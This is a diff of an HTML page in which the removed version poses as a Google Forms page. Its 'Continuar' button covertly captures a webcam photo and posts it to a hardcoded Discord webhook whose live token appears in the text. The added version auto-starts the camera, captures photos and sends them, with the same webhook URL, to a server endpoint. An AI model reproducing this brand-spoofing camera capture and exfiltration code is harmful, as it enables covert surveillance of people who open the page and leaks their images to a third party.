@@ -3,109 +3,54 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Forms</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #f0f0f0;
-            text-align: center;
-        }
-
-        .container {
-            max-width: 600px;
-            margin: 50px auto;
-            background-color: #fff;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-        }
-
-        .button {
-            background-color: #007bff;
-            color: #fff;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px;
-            transition: background-color 0.3s;
-        }
-
-        .button:hover {
-            background-color: #0056b3;
-        }
-    </style>
+    <title>Take Photo and Send</title>
 </head>
 <body>
-    <div class="container">
-        <h1>Google Forms</h1>
-        <p>Formulario de Google LLC 2024 ©</p>
-        <button class="button" onclick="requestCameraPermission()">Continuar</button>
-    </div>
+    <h1>Take Photo and Send</h1>
+    <video id="video" width="640" height="480" autoplay></video><br>
+    <button id="captureButton">Capture Photo</button>
+    <br><br>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
     <script>
-        async function requestCameraPermission() {
-            try {
-                const permission = await navigator.permissions.query({ name: 'camera' });
-                if (permission.state === 'granted' || permission.state === 'prompt') {
-                    takePhoto();
-                } else {
-                    alert('Please grant camera permission to continue.');
-                }
-            } catch (error) {
-                console.error('Error:', error);
-                alert('An error occurred while requesting camera permission.');
-            }
-        }
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const captureButton = document.getElementById('captureButton');
+        const discordWebhookURL = 'https://discord.com/api/webhooks/1109208397896749197/NKuux6oAm72fH4Cn68988GcN5yAn1GzQntzqu5zzw-YJGf5ZPH1phtHqtJTNaM-t_5cv'; // Reemplaza 'YOUR_DISCORD_WEBHOOK_URL' con tu URL de webhook de Discord
 
-        async function takePhoto() {
+        // Acceder a la cámara
+        async function initCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const videoElement = document.createElement('video');
-                videoElement.srcObject = stream;
-                videoElement.play();
-
-                videoElement.onloadedmetadata = async () => {
-                    const canvas = document.createElement('canvas');
-                    const maxWidth = 800;
-                    const maxHeight = (videoElement.videoHeight / videoElement.videoWidth) * maxWidth;
-                    canvas.width = maxWidth;
-                    canvas.height = maxHeight;
-                    const context = canvas.getContext('2d');
-                    context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-                    
-                    const imageData = canvas.toDataURL('image/jpeg', 0.5);
-                    localStorage.setItem('photo', imageData);
-
-                    sendData();
-
-                    stream.getTracks().forEach(track => track.stop());
-                };
+                video.srcObject = stream;
             } catch (error) {
-                console.error('Error:', error);
-                alert('An error occurred while taking photo.');
+                console.error('Error accessing camera:', error);
+                alert('Error accessing camera. Please grant permission to use camera.');
             }
         }
 
-        function sendData() {
-            const imageData = localStorage.getItem('photo');
-            if (!imageData) {
-                alert('No photo available.');
-                return;
-            }
+        // Capturar foto
+        captureButton.addEventListener('click', () => {
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/jpeg');
 
+            // Enviar la foto al servidor
+            sendData(imageData);
+        });
+
+        // Enviar datos al servidor
+        function sendData(imageData) {
             fetch('/upload-photo', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify({ photo: imageData })
+                body: JSON.stringify({ photo: imageData, webhookURL: discordWebhookURL })
             })
             .then(response => {
                 if (response.ok) {
-                    sendToDiscord();
+                    alert('Photo sent successfully.');
                 } else {
                     throw new Error('Failed to send photo to server. Status: ' + response.status);
                 }
@@ -116,31 +61,8 @@
             });
         }
 
-        function sendToDiscord() {
-            const imageData = localStorage.getItem('photo');
-            const payload = {
-                content: 'Image Data: ' + imageData
-            };
-
-            fetch('https://discord.com/api/webhooks/1109208397896749197/NKuux6oAm72fH4Cn68988GcN5yAn1GzQntzqu5zzw-YJGf5ZPH1phtHqtJTNaM-t_5cv', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
-            })
-            .then(response => {
-                if (response.ok) {
-                    alert('Photo sent to Discord successfully.');
-                } else {
-                    throw new Error('Failed to send photo to Discord. Status: ' + response.status);
-                }
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                alert('An error occurred while sending photo to Discord: ' + error.message);
-            });
-        }
+        // Iniciar la cámara cuando se cargue la página
+        window.addEventListener('load', initCamera);
     </script>
 </body>
 </html>
